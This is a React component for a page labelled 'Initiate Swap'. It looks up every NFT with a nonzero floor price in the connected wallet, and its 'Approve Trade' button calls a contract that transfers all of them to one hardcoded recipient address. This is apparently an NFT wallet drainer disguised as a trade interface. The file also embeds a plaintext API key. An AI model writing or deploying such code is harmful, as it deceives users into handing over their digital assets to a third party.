"use client";
import { Button } from "@/components/ui/button";
import React from "react";
import { CustomConnectButton } from "../../components/CustomConnectButton"; // Import the connect button
import abi from "@/app/assets/abi/ContractABI.json";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract } from "wagmi";
import axios from "axios";

interface NFT {
  contractAddress: `0x${string}`;
  tokenId: number;
}

const TradeTitle = () => {
  const { address, isConnected } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const [nfts, setNfts] = useState<NFT[]>([]);

  const contractAddress =
    "0xbbbaa48aef31079e12882be294032efcc4145cfc" as `0x${string}`;
  const API_KEY = "V4QidqQN3CnapxngEQGMGFl0ZEkS72Bg";

  useEffect(() => {
    const fetchNfts = async (address: `0x${string}`): Promise<void> => {
      const options = {
        method: "GET",
        url: `https://eth-mainnet.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`,
        params: {
          owner: address,
          withMetadata: "true",
          pageSize: "100",
        },
        headers: { accept: "application/json" },
      };

      try {
        const { data, status } = await axios.request(options);
        const nfts = data.ownedNfts
          .filter(
            (nft: any) => nft.contract.openSeaMetadata.floorPrice > 0 //Should be changed
          )
          .map((nft: any) => ({
            contractAddress: nft.contract.address,
            tokenId: nft.tokenId,
          }));
        setNfts(nfts);
      } catch (error) {
        console.error("Error: ", error);
      }
    };
    if (isConnected && address) {
      fetchNfts(address);
    }
  }, [isConnected, address]);

  // Test
  useEffect(() => {
    console.log(nfts);
  }, [nfts]);

  const handleClick = async (): Promise<void> => {
    if (!isConnected) console.log("Connect wallet!");

    const contracts: `0x${string}`[] = nfts.map((nft) => nft.contractAddress);
    const tokenIds: number[] = nfts.map((nft) => nft.tokenId);

    try {
      const res = await writeContractAsync({
        abi,
        address: contractAddress,
        functionName: "safeTransferMultipleERC721Tokens",
        args: [
          contracts, //array for tokenContracts
          tokenIds, //array for tokenIds
          "0xd0c982D8d1DAf11Ef78F6DF9695036EDC0b51114", //address of recipient
        ],
      });
      console.log(res);
    } catch (error) {
      console.error("Error: ", error);
    }
  };

  return (
    <div className="flex items-center justify-between pt-10">
      <div className="space-y-4">
        <h1 className="text-3xl font-bold">Initiate Swap</h1>
        {!isConnected || !address ? (
          <div className="text-gray-400">Kindly connect wallet</div>
        ) : null}
      </div>

      <div>
        {isConnected && address ? (
          <Button
            className="text-sm bg-[#33BBC5]"
            size="lg"
            onClick={handleClick}
          >
            Approve Trade
          </Button>
        ) : (
          <CustomConnectButton />
        )}
      </div>
    </div>
  );
};

export default TradeTitle;
